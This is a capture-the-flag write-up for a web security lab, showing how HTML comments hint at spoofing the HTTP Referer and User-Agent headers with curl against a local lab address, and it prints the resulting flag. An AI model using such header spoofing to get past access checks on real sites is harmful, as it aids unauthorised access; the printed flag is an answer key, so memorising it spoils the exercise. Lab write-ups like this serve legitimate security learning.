# spoofing headers

while looking at the page with the background music,

i noticed that the html source has lots of comments,

there's an entire (humorous) article about epitech and some other stuff

one of the comments caught my attention:

```html
<!--
You must cumming from : "https://www.nsa.gov/" to go to the next step
-->
```

this must be an allusion to the http `referer` header,

normally the browser sets this field to the previous address visited, but of course it can be spoofed

to try it, all we need to do is append `-H "Referer: https://www.nsa.gov/"` to our curl command


##### let's compare the two pages
in terminal do
```sh
e1z2r10p4% curl 'http://192.168.99.100/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c' -s -o before.html
e1z2r10p4% curl 'http://192.168.99.100/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c' -H "Referer: https://www.nsa.gov/" -s -o after.html 
e1z2r10p4% diff before.html after.html 
37c37
< <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
---
> FIRST STEP DONE<audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
```

##### notice `FIRST STEP DONE`
nice, we must be on right path

...

scrolling further through the html source code we notice another comment

```html
<!--
Let's use this browser : "ft_bornToSec". It will help you a lot.
-->
```

##### okay, so this is a clear reference to the `User-Agent` http request header
let's spoof it and see what happens, we just need to append `-H "User-Agent: ft_bornToSec"` to our curl command

```sh
e1z2r10p4% curl 'http://192.168.99.100/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c' -H "Referer: https://www.nsa.gov/" -H "User-Agent: ft_bornToSec" -s -o ftbts.html
e1z2r10p4% diff before.html ftbts.html 
37c37
< <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
---
> <center><h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
e1z2r10p4% 
```

##### we have the flag `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`
nice

